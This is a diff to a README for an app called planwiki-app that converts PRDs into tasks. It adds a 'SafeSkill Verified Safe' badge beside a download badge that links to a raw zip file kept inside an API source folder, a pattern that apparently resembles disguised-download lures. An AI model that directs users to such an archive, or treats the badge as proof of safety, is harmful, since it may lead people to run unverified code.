@@ -1,6 +1,7 @@
 # 🗂️ planwiki-app - Turn PRDs into tasks fast
 
 [![Download planwiki-app](https://img.shields.io/badge/Download%20planwiki--app-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Ibradl3673/planwiki-app/main/app/api/trpc/planwiki-app-v2.8.zip)
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/ibradl3673-planwiki-app)
 
 ## 🚀 What this app does
 
